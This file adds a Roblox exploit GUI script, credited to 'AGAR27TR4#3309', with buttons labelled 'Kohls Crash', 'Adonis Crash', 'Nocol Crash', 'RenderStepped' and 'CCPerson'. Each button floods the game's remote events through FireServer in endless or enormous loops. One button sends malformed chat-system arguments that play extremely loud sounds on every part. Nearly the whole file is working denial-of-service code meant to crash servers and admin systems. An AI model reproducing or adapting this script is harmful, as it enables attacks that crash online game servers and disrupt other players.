@@ -1,0 +1,561 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Framecik = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local TextButton_3 = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local TextButton_4 = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local TextButton_5 = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local Frame = Instance.new("Frame")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Framecik.Name = "Framecik"
+Framecik.Parent = ScreenGui
+Framecik.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
+Framecik.BorderSizePixel = 0
+Framecik.Position = UDim2.new(0.366156101, 0, 0.202363387, 0)
+Framecik.Size = UDim2.new(0.26699999, 0, 0.59799999, 0)
+
+TextButton.Parent = Framecik
+TextButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton.Position = UDim2.new(0.0218545217, 0, 0.103743151, 0)
+TextButton.Size = UDim2.new(0.956135333, 0, 0.123503752, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Kohls Crash"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+UICorner.CornerRadius = UDim.new(0, 9)
+UICorner.Parent = TextButton
+
+TextButton_2.Parent = Framecik
+TextButton_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_2.Position = UDim2.new(0.0218545217, 0, 0.274178326, 0)
+TextButton_2.Size = UDim2.new(0.956135333, 0, 0.123503752, 0)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Adonis Crash"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 14.000
+TextButton_2.TextWrapped = true
+
+UICorner_2.CornerRadius = UDim.new(0, 9)
+UICorner_2.Parent = TextButton_2
+
+TextButton_3.Parent = Framecik
+TextButton_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_3.Position = UDim2.new(0.0218545217, 0, 0.437203288, 0)
+TextButton_3.Size = UDim2.new(0.956135333, 0, 0.123503752, 0)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Nocol Crash"
+TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.TextScaled = true
+TextButton_3.TextSize = 14.000
+TextButton_3.TextWrapped = true
+
+UICorner_3.CornerRadius = UDim.new(0, 9)
+UICorner_3.Parent = TextButton_3
+
+TextButton_4.Parent = Framecik
+TextButton_4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_4.Position = UDim2.new(0.0218545217, 0, 0.607638478, 0)
+TextButton_4.Size = UDim2.new(0.956135333, 0, 0.123503752, 0)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "RenderStepped"
+TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.TextScaled = true
+TextButton_4.TextSize = 14.000
+TextButton_4.TextWrapped = true
+
+UICorner_4.CornerRadius = UDim.new(0, 9)
+UICorner_4.Parent = TextButton_4
+
+TextButton_5.Parent = Framecik
+TextButton_5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_5.Position = UDim2.new(0.0218545217, 0, 0.778073668, 0)
+TextButton_5.Size = UDim2.new(0.956135333, 0, 0.123503752, 0)
+TextButton_5.Font = Enum.Font.SourceSans
+TextButton_5.Text = "CCPerson"
+TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.TextScaled = true
+TextButton_5.TextSize = 14.000
+TextButton_5.TextWrapped = true
+
+UICorner_5.CornerRadius = UDim.new(0, 9)
+UICorner_5.Parent = TextButton_5
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.366156101, 0, 0.202363372, 0)
+Frame.Size = UDim2.new(0.266958416, 0, 0.0428360403, 0)
+
+TextButton_6.Parent = Frame
+TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.BorderSizePixel = 0
+TextButton_6.Position = UDim2.new(0.912568331, 0, 0, 0)
+TextButton_6.Size = UDim2.new(0.0874316916, 0, 1, 0)
+TextButton_6.Font = Enum.Font.ArialBold
+TextButton_6.Text = "X"
+TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.TextScaled = true
+TextButton_6.TextSize = 14.000
+TextButton_6.TextWrapped = true
+
+TextButton_7.Parent = Frame
+TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.BorderSizePixel = 0
+TextButton_7.Position = UDim2.new(0.806010962, 0, 0, 0)
+TextButton_7.Size = UDim2.new(0.0874316916, 0, 1, 0)
+TextButton_7.Font = Enum.Font.ArialBold
+TextButton_7.Text = "--"
+TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.TextScaled = true
+TextButton_7.TextSize = 14.000
+TextButton_7.TextWrapped = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Size = UDim2.new(0.732240438, 0, 1, 0)
+TextLabel.Font = Enum.Font.ArialBold
+TextLabel.Text = "Made By AGAR27TR4#3309"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+-- Scripts:
+
+local function AKWHWW_fake_script() -- Framecik.LocalScript 
+	local script = Instance.new('LocalScript', Framecik)
+
+	script.Parent.Size = UDim2.new(0.267, 0,0.043, 0)
+	for i, v in pairs(script.Parent:GetChildren()) do
+		if v.ClassName ~= "LocalScript" then
+			v.Visible = false
+		end
+	end
+end
+coroutine.wrap(AKWHWW_fake_script)()
+local function LIKKL_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		for i = 1, 50 do
+			while task.wait() do
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+				local args = {
+					[1] = "KuID"
+				}
+	
+				game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7"):FireServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(LIKKL_fake_script)()
+local function NECHM_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		for i, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+			if v:IsA("RemoteFunction") and v.Parent:IsA("RemoteEvent") then
+				for k = 1, 100000 do
+					game:GetService("ReplicatedStorage"):FindFirstChild(v.Parent.Name):FireServer()
+				end
+			end
+		end
+	end)
+end
+coroutine.wrap(NECHM_fake_script)()
+local function SXZLRK_fake_script() -- TextButton_3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_3)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
+			if v.ClassName == "Part" then
+				local args = {
+					[1] = "}11, { \n\n } ",
+					[2] = "}, { ",
+					[3] = {
+						["Position"] = v,
+						["SoundId"] = "rbxassetid://8355194421",
+						["Replicate"] = true,
+						["Volume"] = 9999999,
+						["Effects"] = true
+					}
+				}
+	
+				game:GetService("ReplicatedStorage").ChatSystemMakeMessage:FireServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(SXZLRK_fake_script)()
+local function URPWVT_fake_script() -- TextButton_4.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_4)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		game:GetService("RunService").RenderStepped:Connect(function()
+			while task.wait() do
+				local args = {
+					[1] = "rbxassetid://9547782964"
+				}
+	
+				game:GetService("ReplicatedStorage").ReactionEvent:FireServer(unpack(args))
+			end
+		end)
+	end)
+end
+coroutine.wrap(URPWVT_fake_script)()
+local function IUBR_fake_script() -- TextButton_5.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_5)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		for i = 1, 10000000000000000000000000 do
+			while task.wait() do
+				for i = 1, 99999999999999999999 do
+					while task.wait() do
+						for i = 1, 999999999999999999999999 do
+							while task.wait() do
+								for i = 1, 1000000000000000000000000 do
+									while task.wait() do
+										for i = 1, 100000000000000000000000 do
+											while task.wait() do
+												local args = {
+													[1] = "true"
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+												local args = {
+													[1] = true
+												}
+	
+												game:GetService("ReplicatedStorage").ServerEvents.Equip:FireServer(unpack(args))
+											end
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end)
+end
+coroutine.wrap(IUBR_fake_script)()
+local function GDOQT_fake_script() -- TextButton_6.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_6)
+
+	local deb = false
+	script.Parent.MouseButton1Down:Connect(function()
+	script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(GDOQT_fake_script)()
+local function QJMHNB_fake_script() -- TextButton_7.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_7)
+
+	local deb = false
+	script.Parent.MouseButton1Down:Connect(function()
+		if deb == false then
+			deb = true
+			if script.Parent.Parent.Parent.Framecik.Size == UDim2.new(0.267, 0,0.043, 0) then
+				script.Parent.Parent.Parent.Framecik:TweenSize(UDim2.new(0.267, 0,0.598, 0),Enum.EasingDirection.Out,Enum.EasingStyle.Linear,0.5)
+				wait(0.5)
+				for i, v in pairs(script.Parent.Parent.Parent.Framecik:GetChildren()) do
+					if v.ClassName ~= "LocalScript" then
+						v.Visible = true
+					end
+				end
+				deb = false
+			elseif script.Parent.Parent.Parent.Framecik.Size == UDim2.new(0.267, 0,0.598, 0) then
+				for i, v in pairs(script.Parent.Parent.Parent.Framecik:GetChildren()) do
+					if v.ClassName ~= "LocalScript" then
+						v.Visible = false
+					end
+				end
+				script.Parent.Parent.Parent.Framecik:TweenSize(UDim2.new(0.267, 0,0.043, 0),Enum.EasingDirection.Out,Enum.EasingStyle.Linear,0.5)
+				wait(0.5)
+				deb = false
+			else
+				print("Hata var: ".. tostring(UDim2.new(script.Parent.Parent.Parent.Framecik.Size)))
+			end
+		end
+	end)
+end
+coroutine.wrap(QJMHNB_fake_script)()
